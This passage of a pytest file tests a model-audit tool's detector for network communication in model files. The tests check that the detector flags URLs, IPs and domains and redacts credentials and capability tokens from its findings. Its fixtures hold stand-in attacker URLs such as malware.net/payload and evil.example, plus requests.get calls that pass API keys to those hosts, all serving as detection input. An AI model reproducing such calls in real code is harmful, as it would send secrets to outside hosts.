"""Tests for network communication detection."""

import json
import os
import re
from collections.abc import Iterator
from pathlib import Path
from urllib.parse import quote, urlparse

import pytest

from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.detectors import network_comm
from modelaudit.detectors.network_comm import NetworkCommDetector, detect_network_communication


def _is_ci_environment() -> bool:
    """Check CI/GitHub Actions env vars to determine whether tests run in CI."""
    return bool(os.getenv("CI") or os.getenv("GITHUB_ACTIONS"))


class TestNetworkCommDetector:
    """Test the NetworkCommDetector class."""

    def test_detect_urls(self) -> None:
        """Test detection of URLs in binary data."""
        detector = NetworkCommDetector()

        # Test HTTP and HTTPS URLs
        data = b"""
        Some model data
        http://example.com/download
        https://malware.net/payload
        ftp://badserver.com/upload
        """

        findings = detector.scan(data, "test_model.pkl")

        # Should find at least 3 URLs
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        assert len(url_findings) >= 3

        # Check specific URLs are detected
        urls = [f["url"] for f in url_findings]
        assert any(urlparse(url).hostname == "example.com" for url in urls)
        assert any(urlparse(url).hostname == "malware.net" for url in urls)

    def test_detect_urls_redacts_credentials_and_query(self) -> None:
        """URL findings should not preserve credentialed or signed URL secrets."""
        detector = NetworkCommDetector()
        data = (
            b"https://user:pass@example.com/model.bin?"
            b"X-Amz-Signature=SECRET_SIGNATURE&token=SECRET_TOKEN#SECRET_FRAGMENT"
        )

        findings = detector.scan(data, "model.bin")
        url_finding = next(f for f in findings if f["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/model.bin"
        assert "example.com/model.bin" in url_finding["message"]
        serialized = f"{url_finding['url']} {url_finding['message']}"
        assert "user:pass" not in serialized
        assert "SECRET_SIGNATURE" not in serialized
        assert "SECRET_TOKEN" not in serialized
        assert "SECRET_FRAGMENT" not in serialized

    def test_single_quoted_url_with_apostrophe_userinfo_does_not_reexpose_credentials(self) -> None:
        """An RFC-valid apostrophe in userinfo must not turn a credential into the reported host."""
        data = b"requests.get('https://SECRET'@example.com/path')"

        findings = NetworkCommDetector().scan(data, "hook.py")
        serialized = json.dumps(findings, sort_keys=True)

        assert "SECRET" not in serialized
        assert "https://example.com/path" in serialized

    @pytest.mark.parametrize(
        "url, secret",
        [
            ("https://api_key=HOSTSECRET.example.com/path", "HOSTSECRET"),
            ("https://AKIAIOSFODNN7EXAMPLE.example.com/path", "AKIAIOSFODNN7EXAMPLE"),
        ],
    )
    def test_detect_urls_redacts_hostname_credentials(self, url: str, secret: str) -> None:
        """Credential-shaped hostname labels must not survive URL or domain findings."""
        findings = NetworkCommDetector().scan(url.encode(), "model.bin")

        serialized = json.dumps(findings, sort_keys=True)
        assert secret.lower() not in serialized.lower()
        assert "https://<redacted>.example.com/path" in serialized

    def test_detect_urls_redacts_over_encoded_hostname_credentials(self) -> None:
        """Host labels that exceed the decode bound must fail closed instead of retaining encoded credentials."""
        encoded_label = "".join(f"%{ord(character):02X}" for character in "api_key=HOSTSECRET")
        for _ in range(8):
            encoded_label = encoded_label.replace("%", "%25")

        findings = NetworkCommDetector().scan(f"https://{encoded_label}.example.com/path".encode(), "model.bin")
        serialized = json.dumps(findings, sort_keys=True)

        assert encoded_label not in serialized
        assert "https://<redacted>.example.com/path" in serialized

    @pytest.mark.parametrize("key", ["token", "api_key"])
    def test_detect_urls_redacts_hostname_key_value_labels(self, key: str) -> None:
        """Sensitive hostname key labels must redact the following value label."""
        secret = "SECRET123"
        findings = NetworkCommDetector().scan(f"https://{key}.{secret}.example.com/path".encode(), "model.bin")
        serialized = json.dumps(findings, sort_keys=True)

        assert secret.lower() not in serialized.lower()
        assert f"https://{key}.<redacted>.example.com/path" in serialized

    @pytest.mark.parametrize(
        ("key", "secret"),
        [("api_key", "HOSTSECRET"), ("token", "SECRET123")],
    )
    def test_detect_urls_redacts_three_label_hostname_credentials(self, key: str, secret: str) -> None:
        findings = NetworkCommDetector().scan(f"https://{key}.{secret}.com/path".encode(), "model.bin")
        serialized = json.dumps(findings, sort_keys=True)

        assert secret.lower() not in serialized.lower()
        assert f"https://{key}.<redacted>.com/path" in serialized

    def test_detect_urls_preserves_sensitive_word_as_registrable_subdomain(self) -> None:
        """A sensitive word without a separate value label should remain useful hostname context."""
        url = "https://token.example.com/path"

        findings = NetworkCommDetector().scan(url.encode(), "model.bin")

        assert any(finding["type"] == "url_detected" and finding["url"] == url for finding in findings)

    def test_authorization_hostname_redaction_preserves_registrable_domain(self) -> None:
        """An auth-scheme candidate must not consume the hostname's registrable suffix."""
        url = "https://auth.token.com/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.com/path"

    def test_authorization_hostname_redacts_payload_before_registrable_domain(self) -> None:
        """Authorization metadata can still introduce a payload when two domain labels remain."""
        url = "https://auth.Bearer.SECRET123.example.com/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.<redacted>.example.com/path"

    def test_authorization_hostname_preserves_multi_label_registrable_domain(self) -> None:
        """An ambiguous auth scheme must not consume a multi-label registrable domain."""
        urls = [
            "https://auth.token.example.co.uk/path",
            "https://auth.token.example.github.io/path",
            "https://auth.token.bucket.s3.amazonaws.com/path",
        ]

        redacted = [network_comm.redact_url_for_finding(url) for url in urls]

        assert redacted == [
            "https://auth.<redacted>.example.co.uk/path",
            "https://auth.<redacted>.example.github.io/path",
            "https://auth.<redacted>.bucket.s3.amazonaws.com/path",
        ]

    @pytest.mark.parametrize("scheme", ["token", "Bearer"])
    def test_authorization_hostname_preserves_psl_private_suffix_context(self, scheme: str) -> None:
        """Private PSL suffixes must retain their registrable hostname label."""
        url = f"https://auth.{scheme}.example.workers.dev/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.example.workers.dev/path"

    def test_authorization_hostname_psl_context_survives_full_scan(self) -> None:
        url = "https://auth.token.example.workers.dev/path"

        findings = NetworkCommDetector().scan(url.encode(), "model.bin")
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://auth.<redacted>.example.workers.dev/path" in serialized
        assert "auth.<redacted>.<redacted>.workers.dev" not in serialized

    @pytest.mark.parametrize(
        "url",
        [
            "https://auth.token.hunter2.co.uk/path",
            "https://auth.Bearer.hunter2.pages.dev/path",
            "https://auth.token.hunter2.workers.dev/path",
        ],
    )
    def test_authorization_hostname_redacts_low_entropy_payload_before_psl_suffix(self, url: str) -> None:
        findings = NetworkCommDetector().scan(url.encode(), "model.bin")
        serialized = json.dumps(findings, sort_keys=True)

        assert "hunter2" not in serialized

    @pytest.mark.parametrize("scheme", ["token", "Bearer"])
    def test_authorization_hostname_preserves_psl_context_with_root_dot(self, scheme: str) -> None:
        url = f"https://auth.{scheme}.example.workers.dev./path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.example.workers.dev./path"

    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            (
                "https://auth.token.example.foo.ck/path",
                "https://auth.<redacted>.example.foo.ck/path",
            ),
            (
                "https://auth.token.payload.example.www.ck/path",
                "https://auth.<redacted>.<redacted>.example.www.ck/path",
            ),
        ],
    )
    def test_authorization_hostname_applies_psl_wildcard_and_exception_rules(
        self,
        url: str,
        expected: str,
    ) -> None:
        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == expected

    def test_authorization_hostname_redacts_ambiguous_payload_with_extra_domain_context(self) -> None:
        """Ambiguous schemes still carry redaction when enough hostname context remains."""
        urls = [
            "https://auth.token.payload.sub.example.com/path",
            "https://auth.token.payload.bucket.s3.amazonaws.com/path",
        ]

        redacted = [network_comm.redact_url_for_finding(url) for url in urls]

        assert redacted == [
            "https://auth.<redacted>.<redacted>.sub.example.com/path",
            "https://auth.<redacted>.<redacted>.bucket.s3.amazonaws.com/path",
        ]

    def test_authorization_hostname_redacts_ambiguous_payload_before_standard_domain(self) -> None:
        url = "https://auth.token.payload.example.com/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.<redacted>.example.com/path"

    def test_authorization_hostname_redacts_low_entropy_payload_before_standard_domain(self) -> None:
        """Public-suffix preservation must not expose a short explicit auth payload."""
        url = "https://auth.Bearer.hunter2.example.com/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.<redacted>.example.com/path"

    def test_authorization_hostname_redacts_short_bearer_payload(self) -> None:
        """A strong auth scheme still redacts a short payload immediately before the TLD."""
        url = "https://auth.Bearer.SECRET.com/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.<redacted>.com/path"

    def test_authorization_hostname_redacts_low_entropy_bearer_payload(self) -> None:
        """A strong auth scheme makes an otherwise domain-like label sensitive."""
        url = "https://auth.Bearer.hunter2.com/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.<redacted>.com/path"

    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            ("https://auth.Bearer.com/path", "https://auth.bearer.com/path"),
            ("https://auth.Bearer.example.com/path", "https://auth.<redacted>.example.com/path"),
        ],
    )
    def test_authorization_hostname_preserves_domain_after_bare_scheme(self, url: str, expected: str) -> None:
        """A scheme without a credential payload must not consume the registrable domain."""
        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == expected

    def test_authorization_hostname_preserves_strong_scheme_multi_label_registrable_domain(self) -> None:
        url = "https://auth.Bearer.example.co.uk/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.example.co.uk/path"

    def test_detect_urls_redacts_value_after_over_encoded_hostname_key(self) -> None:
        """Decode-depth exhaustion on a hostname key must also redact its following value."""
        encoded_key = "".join(f"%{ord(character):02X}" for character in "api_key")
        for _ in range(8):
            encoded_key = encoded_key.replace("%", "%25")
        secret = "SECRET123"

        findings = NetworkCommDetector().scan(
            f"https://{encoded_key}.{secret}.example.com/path".encode(),
            "model.bin",
        )
        serialized = json.dumps(findings, sort_keys=True)

        assert secret.lower() not in serialized.lower()
        assert "https://<redacted>.<redacted>.example.com/path" in serialized

    @pytest.mark.parametrize("component", ["query", "fragment"])
    def test_encoded_nested_domain_credential_does_not_create_domain_finding(self, component: str) -> None:
        """The hex bytes of an encoded assignment separator are not a domain prefix."""
        separator = "?" if component == "query" else "#"
        url = f"https://evil.example/download{separator}next=https%3A//nested.example/token%3Devil.com"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")
        serialized = json.dumps(findings, sort_keys=True).lower()

        assert "evil.com" not in serialized
        assert not any(finding.get("domain") == "3devil.com" for finding in findings)
        assert any(finding.get("url") == "https://nested.example/<redacted>" for finding in findings)

    def test_detect_urls_preserves_port_zero_and_rejects_hostless_netloc(self) -> None:
        """URL redaction should preserve explicit port 0 and avoid hostless netloc output."""
        detector = NetworkCommDetector()
        data = b"https://example.com:0/model.bin?token=SECRET https://@/missing-host"

        findings = detector.scan(data, "model.bin")
        url_findings = [finding for finding in findings if finding["type"] == "url_detected"]
        urls = [finding["url"] for finding in url_findings]

        assert "https://example.com:0/model.bin" in urls
        assert "[invalid-url]" in urls
        serialized = " ".join(f"{finding['url']} {finding['message']}" for finding in url_findings)
        assert "token=SECRET" not in serialized
        assert "https:///missing-host" not in serialized

    def test_cloud_storage_urls_redact_signed_query(self) -> None:
        """Cloud storage findings should redact signed URL query material."""
        detector = NetworkCommDetector()
        data = b"s3://model-bucket/path/model.bin?X-Amz-Credential=SECRET_CREDENTIAL&X-Amz-Signature=SECRET_SIGNATURE"

        findings = detector.scan(data, "model.bin")
        cloud_finding = next(f for f in findings if f["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "s3://model-bucket/path/model.bin"
        assert "model-bucket/path/model.bin" in cloud_finding["message"]
        serialized = f"{cloud_finding['url']} {cloud_finding['message']}"
        assert "SECRET_CREDENTIAL" not in serialized
        assert "SECRET_SIGNATURE" not in serialized
        assert cloud_finding["provider"] == "s3"

    def test_slack_webhook_path_tokens_are_redacted(self) -> None:
        """Slack webhook capability tokens should not survive URL findings."""
        detector = NetworkCommDetector()
        webhook_token = "SECRETWEBHOOKTOKEN123456"
        data = f"https://hooks.slack.com/services/T00000000/B00000000/{webhook_token}".encode()

        findings = detector.scan(data, "model.pkl")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://hooks.slack.com/services/<redacted>/<redacted>/<redacted>"
        assert webhook_token not in json.dumps(url_finding, sort_keys=True)

    def test_cloud_storage_path_capability_tokens_are_redacted(self) -> None:
        """Signed object URLs can carry capability tokens in path segments."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = (
            f"https://storage.googleapis.com/model-bucket/{path_token}/weights.bin?X-Goog-Signature=QUERYSECRET"
        ).encode()

        findings = detector.scan(data, "model.bin")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert path_token not in serialized
        assert "QUERYSECRET" not in serialized
        assert "storage.googleapis.com/model-bucket/<redacted>/weights.bin" in serialized

    def test_trailing_path_delimiters_do_not_prevent_token_redaction(self) -> None:
        """Punctuation included by URL matching should not keep path tokens raw."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = f"https://example.com/path/{path_token},".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>,"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_quoted_path_delimiters_do_not_prevent_token_redaction(self) -> None:
        """Single-quoted source strings should not keep path tokens raw."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = f"url='https://example.com/path/{path_token}'".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_base64_path_capability_tokens_are_redacted(self) -> None:
        """Base64/base64url path tokens may contain encoded separators or padding."""
        detector = NetworkCommDetector()
        encoded_token = "AbCdEfGhIjKlMnOpQrStUvWxYz1234567890%2B%2F%3D"

        findings = detector.scan(f"https://example.com/download/{encoded_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert encoded_token not in json.dumps(url_finding, sort_keys=True)

    def test_base64url_path_capability_tokens_with_hyphen_are_redacted(self) -> None:
        """Base64url path tokens can contain hyphens as data."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz123456-_"

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_long_base64_path_capability_tokens_use_entropy_not_unique_ratio(self) -> None:
        """Long signed-CDN style path tokens should still be redacted."""
        detector = NetworkCommDetector()
        path_token = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=" * 3

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_known_path_tokens_with_filename_suffix_are_redacted(self) -> None:
        """Known token formats must win over filename preservation."""
        detector = NetworkCommDetector()
        github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
        segment = f"{github_token}.json"

        findings = detector.scan(f"https://example.com/path/{segment}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>.json"
        assert github_token not in json.dumps(url_finding, sort_keys=True)

    def test_dotted_opaque_path_capability_tokens_are_redacted(self) -> None:
        """Unknown dotted opaque tokens should not hide behind broad filename parsing."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWx.Yz1234567890abcdefGhij.Klmn"

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_parameter_tokens_are_redacted(self) -> None:
        """Matrix-style path parameters can carry capability tokens."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download;token={path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_parameter_key_value_parts_are_redacted(self) -> None:
        """Matrix-style sensitive keys can carry their value in the next part."""
        detector = NetworkCommDetector()
        path_token = "SECRET123"

        findings = detector.scan(
            f"requests.get('https://evil.example/path;api_key;{path_token}/model.bin')".encode(),
            "metadata.py",
        )
        serialized = json.dumps(findings, sort_keys=True)
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert url_finding["url"] == "https://evil.example/path;api_key;<redacted>/model.bin"
        assert network_finding["snippet"] == "requests.get https://evil.example/path;api_key;<redacted>/model.bin"
        assert path_token not in serialized

    @pytest.mark.parametrize(
        ("path", "safe_path"),
        [
            ("path&api_key&SECRET123", "path&api_key&<redacted>"),
            ("path%26api_key%26SECRET123", "path&api_key&<redacted>"),
            ("path,api_key,SECRET123", "path,api_key,<redacted>"),
        ],
    )
    def test_boundary_path_key_value_parts_are_redacted(self, path: str, safe_path: str) -> None:
        """Boundary-separated sensitive keys must redact the following low-entropy value."""
        data = f"requests.get('https://evil.example/{path}/model.bin')".encode()

        findings = NetworkCommDetector().scan(data, "metadata.py")
        serialized = json.dumps(findings, sort_keys=True)
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")

        assert url_finding["url"] == f"https://evil.example/{safe_path}/model.bin"
        assert network_finding["snippet"] == f"requests.get https://evil.example/{safe_path}/model.bin"
        assert "SECRET123" not in serialized

    def test_boundary_path_key_near_match_preserves_following_value(self) -> None:
        """Non-sensitive boundary components must not redact ordinary following path data."""
        url = "https://evil.example/path&api_keyboard&SECRET123/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_encoded_path_parameter_tokens_are_redacted(self) -> None:
        """Encoded matrix delimiters should still expose path parameter tokens."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download%3Btoken={path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_parameter_key_tokens_are_redacted(self) -> None:
        """Matrix parameter names can carry capability tokens too."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download;{path_token}=1/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download;<redacted>=1/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_segment_tokens_before_matrix_parameters_are_redacted(self) -> None:
        """A token segment followed by benign matrix params should still be redacted."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/{path_token};v=1/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>;v=1/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_authorization_matrix_assignment_redacts_following_payload(self) -> None:
        """A scheme-only Authorization parameter must carry redaction to the next matrix field."""
        secret = "secret.example.com"
        url = f"https://evil.example/path;authorization=Bearer;{secret}/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert secret not in serialized
        assert "path;authorization=<redacted>;<redacted>/model.bin" in serialized

    def test_authorization_matrix_assignment_preserves_artifact_filename(self) -> None:
        """A scheme-only Authorization parameter must not consume a following artifact name."""
        url = "https://evil.example/path;authorization=Bearer;model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://evil.example/path;authorization=<redacted>;model.bin"

    def test_authorization_matrix_assignment_preserves_following_endpoint(self) -> None:
        """A scheme-only Authorization parameter must not suppress a following destination field."""
        ip = "45.33.32.156"
        url = f"https://evil.example/path;authorization=Bearer;next={ip}/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")

        assert any(
            finding.get("url") == f"https://evil.example/path;authorization=<redacted>;next={ip}/model.bin"
            for finding in findings
        )
        assert any(finding.get("ip") == ip for finding in findings)

    @pytest.mark.parametrize("endpoint", ["45.33.32.156", "45.33.32.156:443", "[2001:4860:4860::8888]:443"])
    def test_authorization_matrix_assignment_preserves_bare_ip_endpoint(self, endpoint: str) -> None:
        url = f"https://evil.example/path;authorization=Bearer;{endpoint}/model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == f"https://evil.example/path;authorization=<redacted>;{endpoint}/model.bin"

    def test_authorization_matrix_assignment_reports_bare_ip_endpoint(self) -> None:
        ip = "45.33.32.156"
        url = f"https://evil.example/path;authorization=Bearer;{ip}/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")

        assert any(finding.get("ip") == ip for finding in findings)

    def test_authorization_matrix_assignment_reports_port_qualified_ip_endpoint(self) -> None:
        ip = "45.33.32.156"
        port = 6379
        url = f"https://evil.example/path;authorization=Bearer;{ip}:{port}/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")

        assert any(finding.get("ip") == ip for finding in findings)
        assert any(finding.get("port") == port for finding in findings)

    def test_authorization_matrix_assignment_preserves_bare_domain_endpoint(self) -> None:
        domain = "download.example.com"
        url = f"https://evil.example/path;authorization=Bearer;{domain}/model.bin"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")

        assert any(
            finding.get("url") == f"https://evil.example/path;authorization=<redacted>;{domain}/model.bin"
            for finding in findings
        )
        assert any(finding.get("domain") == domain for finding in findings)

    @pytest.mark.parametrize(
        "flag_value",
        ["anonymous", "auto", "default", "disabled", "enabled", "false", "inherit", "none", "off", "optional"],
    )
    def test_authorization_flag_value_does_not_consume_bare_domain_endpoint(self, flag_value: str) -> None:
        domain = "download.example.com"
        url = f"https://evil.example/path;auth={flag_value};{domain}/model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == f"https://evil.example/path;auth=<redacted>;{domain}/model.bin"

    @pytest.mark.parametrize(
        "url",
        [
            "https://evil.example/path;authorization=Bearer;Bearer;secret.example.com/model.bin",
            "https://evil.example/path,authorization=Bearer,Bearer,secret.example.com,model.bin",
            "https://evil.example/Authorization/Bearer/Bearer/secret.example.com/model.bin",
            "https://auth.Bearer.Bearer.secret.example.com/path",
        ],
    )
    def test_authorization_redacts_duplicate_scheme_payload(self, url: str) -> None:
        secret = "secret.example.com"

        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert secret not in serialized

    def test_authorization_matrix_assignment_redacts_invalid_ip_port_payload(self) -> None:
        url = "https://evil.example/path;authorization=Bearer;45.33.32.156:99999/model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://evil.example/path;authorization=<redacted>;<redacted>/model.bin"

    @pytest.mark.parametrize("scheme", ["token", "Bearer"])
    def test_authorization_hostname_redacts_payload_before_multi_label_domain(self, scheme: str) -> None:
        url = f"https://auth.{scheme}.payload.example.co.uk/path"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://auth.<redacted>.<redacted>.example.co.uk/path"

    @pytest.mark.parametrize("separator", [",", "&", "&amp;"])
    def test_authorization_boundary_assignment_redacts_following_payload(self, separator: str) -> None:
        """A scheme-only assignment must carry across sensitive boundary delimiters."""
        secret = "secret.example.com"
        url = f"https://evil.example/path{separator}authorization=Bearer{separator}{secret}{separator}model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == (
            f"https://evil.example/path{separator}authorization=<redacted>{separator}<redacted>{separator}model.bin"
        )

    @pytest.mark.parametrize("following_value", ["model.bin", "next=45.33.32.156"])
    def test_authorization_boundary_assignment_preserves_noncredential_value(self, following_value: str) -> None:
        """Boundary carry-over must not consume artifacts or explicit endpoints."""
        url = f"https://evil.example/path,authorization=Bearer,{following_value}"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == f"https://evil.example/path,authorization=<redacted>,{following_value}"

    @pytest.mark.parametrize("separator", ["&", "&amp;"])
    def test_ampersand_delimited_path_tokens_are_redacted(self, separator: str) -> None:
        """Ampersand-style path suffixes should not hide capability token prefixes."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/{path_token}{separator}download=1".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/<redacted>{separator}download=1"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", ["&", "&amp;"])
    def test_ampersand_suffix_path_tokens_are_redacted(self, separator: str) -> None:
        """Ampersand-delimited suffix tokens should not survive after benign prefixes."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/download=1{separator}{path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/download=1{separator}<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", ["&", "&amp;"])
    def test_ampersand_key_value_suffix_path_tokens_are_redacted(self, separator: str) -> None:
        """Ampersand-delimited key/value suffix tokens should be redacted too."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/download=1{separator}token={path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/download=1{separator}token=<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize(
        ("encoded_suffix", "expected_suffix"),
        [("%3Fdownload=1", "?download=1"), ("%20download", " download")],
    )
    def test_encoded_delimited_path_tokens_are_redacted(self, encoded_suffix: str, expected_suffix: str) -> None:
        """Encoded URL delimiters should not hide capability token prefixes."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/{path_token}{encoded_suffix}".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/<redacted>{expected_suffix}"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_public_revision_hash_paths_are_preserved(self) -> None:
        """Public model revision hashes should remain useful for audit follow-up."""
        detector = NetworkCommDetector()
        revision = "0123456789abcdef0123456789abcdef01234567"
        data = f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert revision in url_finding["url"]
        assert url_finding["url"].endswith(f"/{revision}/model.safetensors")

    def test_public_revision_names_are_preserved(self) -> None:
        """Public model branch and tag names should remain useful for audit follow-up."""
        detector = NetworkCommDetector()
        revision = "ReleaseCandidate2025-05-abcdef"
        data = f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors"

    def test_known_credentials_in_public_revision_position_are_redacted(self) -> None:
        """Known secret formats should not be preserved as public model revision names."""
        detector = NetworkCommDetector()
        revision = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
        data = f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://huggingface.co/org/repo/resolve/<redacted>/model.safetensors"
        assert revision not in json.dumps(url_finding, sort_keys=True)

    def test_public_model_repository_ids_are_preserved(self) -> None:
        """Known public model hosts should keep repo IDs for audit follow-up."""
        detector = NetworkCommDetector()
